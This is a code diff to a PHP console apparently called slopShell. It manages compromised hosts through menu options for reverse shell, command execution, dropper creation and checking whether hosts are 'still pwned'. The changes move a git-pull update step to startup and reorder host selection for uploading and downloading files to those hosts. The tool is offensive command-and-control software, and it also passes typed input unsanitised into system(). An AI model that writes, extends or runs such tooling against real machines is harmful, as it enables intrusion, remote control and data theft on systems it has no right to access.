@@ -24,8 +24,7 @@ $cof = array(
 
 );
 //todo need to figure out why this is no longer working on raspi
-//$success = null;
-//$te = system("bg $( which bash ) -c 'nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &'", $success);
+//$te = system("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &");
 is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true)) : define("config", $cof);
 if (empty(config['pass'])) {
     define('DBCONN', sprintf("host=%s port=%s user=%s dbname=%s",
@@ -109,8 +108,7 @@ function menu()
         (Rev)erse shell                                                             
         (Com)mand Execution                                                         
         (CL)oner
-        (CR)eate Dropper\e[0m                                                                  
-        \e[0;31;40m(U)pdates  -> not implemented yet.\e[0m                                                                 
+        (CR)eate Dropper\e[0m                                                                                                                               
         \e[0;32m(A)dd new host                                                              
         (CH)eck if hosts are still pwned
         (AT) Add tool\e[0m
@@ -776,6 +774,13 @@ function queryDB($host, $fetchWhat)
 
 $run = true;
 logo($lc = null, clears, "", "", '');
+echo "[ ++ ] Checking for updates [ ++ ]".PHP_EOL;
+if (strstr(getcwd(), "slopShell") == true) {
+    system("git pull");
+} else {
+    $homie = readline("Where is slopshell downloaded to?->");
+    system("cd {$homie} && git pull");
+}
 while ($run) {
     $h = null;
     $p = null;
@@ -832,12 +837,12 @@ while ($run) {
             break;
         case "up":
             $u = readline("[ !! ] Are we uploading or downloading?".PHP_EOL."(u/d)->");
+            awesomeMenu("hosts");
+            $t = readline("->");
             if (strtolower($u) === "d") {
-                b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", array());
+                b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", $t);
             }else{
                 $x = awesomeMenu("tools");
-                awesomeMenu("hosts");
-                $t = readline("->");
                 b64($x, "u", $t);
             }
             break;
@@ -909,15 +914,6 @@ while ($run) {
                 clo($h, $rep, queryDB($h, "cl"));
             } catch (Exception $e) {
                 logo("cl", clears, true, $e, $h);
-            }
-            break;
-        case "u":
-            system(clears);
-            if (strstr(getcwd(), "slopShell") == true) {
-                system("git pull");
-            } else {
-                $homie = readline("Where is slopshell downloaded to?->");
-                system("cd {$homie} && git pull");
             }
             break;
         case "a":
